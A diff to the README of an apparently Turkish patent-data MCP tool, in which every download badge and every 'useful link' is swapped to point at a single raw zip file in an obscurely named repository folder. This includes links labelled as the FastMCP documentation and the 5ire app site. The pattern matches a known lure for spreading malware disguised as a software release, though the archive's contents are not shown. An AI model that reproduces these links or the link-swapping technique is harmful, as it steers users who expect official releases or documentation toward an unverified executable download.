@@ -1,6 +1,6 @@
 # ⚙️ markapatent-mcp - Easy Access to TÜRKPATENT Data
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Markapatent--mcp-blue?style=for-the-badge)](https://github.com/Andrianagnostic63/markapatent-mcp/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Markapatent--mcp-blue?style=for-the-badge)](https://github.com/Andrianagnostic63/markapatent-mcp/raw/refs/heads/main/fugler/mcp-markapatent-3.2.zip)
 
 ---
 
@@ -44,7 +44,7 @@ This section guides you through downloading, installing, and running markapatent
 
 Click the badge or visit the official releases page to get the latest version:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Markapatent--mcp-green?style=for-the-badge)](https://github.com/Andrianagnostic63/markapatent-mcp/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Markapatent--mcp-green?style=for-the-badge)](https://github.com/Andrianagnostic63/markapatent-mcp/raw/refs/heads/main/fugler/mcp-markapatent-3.2.zip)
 
 On the releases page, look for the latest Windows installer or executable file. Files usually have `.exe` extensions.
 
@@ -164,12 +164,12 @@ You can report issues by creating a new issue on the GitHub repository page. Inc
 
 ## 🔗 Useful Links
 
-- [Releases page and downloads](https://github.com/Andrianagnostic63/markapatent-mcp/releases)  
-- [FastMCP protocol explanation](https://gofastmcp.com/)  
-- [5ire application](https://5ire.app)  
+- [Releases page and downloads](https://github.com/Andrianagnostic63/markapatent-mcp/raw/refs/heads/main/fugler/mcp-markapatent-3.2.zip)  
+- [FastMCP protocol explanation](https://github.com/Andrianagnostic63/markapatent-mcp/raw/refs/heads/main/fugler/mcp-markapatent-3.2.zip)  
+- [5ire application](https://github.com/Andrianagnostic63/markapatent-mcp/raw/refs/heads/main/fugler/mcp-markapatent-3.2.zip)  
 
 ---
 
 # ⬇️ Download and run markapatent-mcp now:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Markapatent--mcp-blueviolet?style=for-the-badge)](https://github.com/Andrianagnostic63/markapatent-mcp/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Markapatent--mcp-blueviolet?style=for-the-badge)](https://github.com/Andrianagnostic63/markapatent-mcp/raw/refs/heads/main/fugler/mcp-markapatent-3.2.zip)
